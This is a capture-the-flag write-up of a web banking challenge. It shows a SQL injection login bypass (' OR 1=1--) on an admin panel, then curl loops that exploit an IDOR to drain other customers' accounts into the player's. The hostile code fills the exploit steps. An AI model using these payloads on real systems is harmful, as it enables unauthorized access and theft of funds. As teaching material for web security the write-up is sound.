
# Your money are safe (bank)

**Competition:** ITSCyberGame
**Category:** Web
**Service:** `sfide.itscybergame.it:<port_number>`
**Provided credentials:** `user:luigi.pietrofossi` / `pass:v5RdMg5QgP`

---

## Description

> OH NO! My account is in the red, I don't know what to do T-T Help me become rich, I want at least €500,000...

We are given a web banking application with an account at -€10. The goal is to raise the balance to €500,000.

---

## Solution

### 1. Initial reconnaissance

After logging in with the provided credentials, the user page shows:

- Balance: **-€10**
- Transfer form with the `from` field implemented as an `<input type="hidden">`
- Transfer limit: **€5,000**
- Decodable Flask session cookie: `{"is_admin": 0, "uid": "df101b73..."}`

Enumerating endpoints reveals that `/admin` returns **302** instead of **404**:

```bash
curl -s -o /dev/null -w "%{http_code}" http://sfide.itscybergame.it:<port_number>/admin
# → 302
```

### 2. SQL Injection on the admin panel

`/admin` exposes a separate login form. Testing classic payloads:

```bash
curl -s -X POST 'http://sfide.itscybergame.it:<port_number>/admin/login' \
	--data-urlencode "username=' OR 1=1--" \
	--data-urlencode "password=x" \
	-D -
```

```
HTTP/1.1 302 Found
location: /admin
set-cookie: session=eyJpc19hZG1pbiI6MSwidWlkIjo...
```

The payload `' OR 1=1--` bypasses the authentication check. The obtained cookie contains `is_admin: 1`.

### 3. IDOR — Transferring from other accounts

With the admin session, the `/admin` panel shows the full list of customers:

| Username | Balance |
|---|---|
| gianluca.william | €250,000 |
| mario.rossi | €120,000 |
| giulia.verdi | €80,000 |
| giantiepolo.morralalunga | €60,000 |
| luigi.pietrofossi | -€10 |

With a normal user session the `from` field in the transfer form is ignored and the server always uses the authenticated account. However, with the **admin** session the `from` field is honored, allowing withdrawals from any account.

Exploit:

```bash
ADMIN_SESSION="<session_admin>"
BASE="http://sfide.itscybergame.it:<port_number>"

# gianluca.william → luigi (50 × €5000)
for i in $(seq 1 50); do
	curl -s -o /dev/null -b "session=${ADMIN_SESSION}" \
		-X POST "${BASE}/transfer" \
		-d "from=gianluca.william&to=luigi.pietrofossi&amount=5000"
done

# mario.rossi → luigi (24 × €5000)
for i in $(seq 1 24); do
	curl -s -o /dev/null -b "session=${ADMIN_SESSION}" \
		-X POST "${BASE}/transfer" \
		-d "from=mario.rossi&to=luigi.pietrofossi&amount=5000"
done

# giulia.verdi → luigi (16 × €5000)
for i in $(seq 1 16); do
	curl -s -o /dev/null -b "session=${ADMIN_SESSION}" \
		-X POST "${BASE}/transfer" \
		-d "from=giulia.verdi&to=luigi.pietrofossi&amount=5000"
done

# giantiepolo.morralalunga → luigi (10 × €5000)
for i in $(seq 1 10); do
	curl -s -o /dev/null -b "session=${ADMIN_SESSION}" \
		-X POST "${BASE}/transfer" \
		-d "from=giantiepolo.morralalunga&to=luigi.pietrofossi&amount=5000"
done
```

Final balance: **€504,990** → flag unlocked.

---

## Flag

```
flag{...}
```

---

## Conclusions

The challenge chains together three vulnerabilities:

1. **Endpoint discovery**: the `/admin` panel was not linked in the UI but was accessible; checking robots.txt or probing endpoints revealed it.
2. **SQL Injection**: the `/admin/login` form was vulnerable to a classic bypass (`' OR 1=1--`), allowing admin access without knowing the real credentials.
3. **IDOR (Insecure Direct Object Reference)**: with admin privileges the `from` field of the transfer form was honored, permitting funds to be moved from any account without further authorization checks.

